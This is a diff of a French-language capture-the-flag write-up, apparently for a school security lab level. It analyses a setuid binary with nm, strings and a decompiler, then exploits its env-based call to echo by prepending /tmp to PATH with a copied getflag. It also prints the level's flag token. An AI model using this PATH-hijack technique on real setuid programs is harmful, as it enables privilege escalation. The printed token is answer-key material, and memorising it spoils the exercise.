@@ -8,52 +8,49 @@
     ```
     > Exploit me
 
-parametres ? nm ?
-gdb ?
-   - man gdb
-ghidra ? peda ?
+- Le comportement du binaire ne change pas avec des paramètres
+  
+- Comprendre la composition du binaire : *avec nm, gdb, strings ou hexdump* :
+  
+  *Dans la VM :*
 
- ```
- $> git clone https://github.com/longld/peda.git ~/peda
- $> scp -P 4242 -r ~/peda/ level03@10.11.200.185:/tmp
- ```
+    `nm -u level03`
 
-*Dans la VM :*
-```
-$> gdb ~/level03
-gdb$> source /tmp/peda/peda.py
-gdb-peda$>        
-```
+        U getegid@@GLIBC_2.0
+        U geteuid@@GLIBC_2.0
+        U setresgid@@GLIBC_2.0
+        U setresuid@@GLIBC_2.0
+        U system@@GLIBC_2.0
+
+    `strings ~/level03  `
+    > /usr/bin/env echo Exploit me
+
+    **OU**
+
+    `hexdump -C level03`
+
+    ```
+    000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
+    000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....|
+    ```
+
+- echo est appelé via `/usr/bin/env`
+- Rajouter le dossier `/tmp` dans le path et placer dedans une copie du binaire `getflag` renommé en `echo` afin que `/usr/bin/env` appelle notre copie de getflag à la place de `echo`.
+
+    ```
+    $> echo $PATH
+    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+    $> export PATH=/tmp:$PATH
+    $> which getflag
+    /bin/getflag
+    $> cp /bin/getflag /tmp/echo
+    $> cd ~ ; ./level03
+    ```
+
+    > Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
 
 ## Ressources
-- https://medium.com/@rickharris_dev/reverse-engineering-using-linux-gdb-a99611ab2d32
-- https://ghidra-sre.org/InstallationGuide.html#Install
-
-
-Décompile avec cutter
-
-```
-void main(void)
-{
-    undefined4 uVar1;
-    undefined4 uVar2;
-    
-    uVar1 = getegid();
-    uVar2 = geteuid();
-    setresgid(uVar1, uVar1, uVar1);
-    setresuid(uVar2, uVar2, uVar2);
-    system("/usr/bin/env echo Exploit me");
-    return;
-}
-```
-```
-$> echo $PATH
-$> export PATH=/tmp:$PATH
-$> which getflag
-$> /bin/getflag
-$> cp /bin/getflag /tmp/echo
-$> cd ~ ; ./level03````
-$> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
-```
-
-> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+- https://fr.wikipedia.org/wiki/Env
+- `man nm`
+- `man strings`
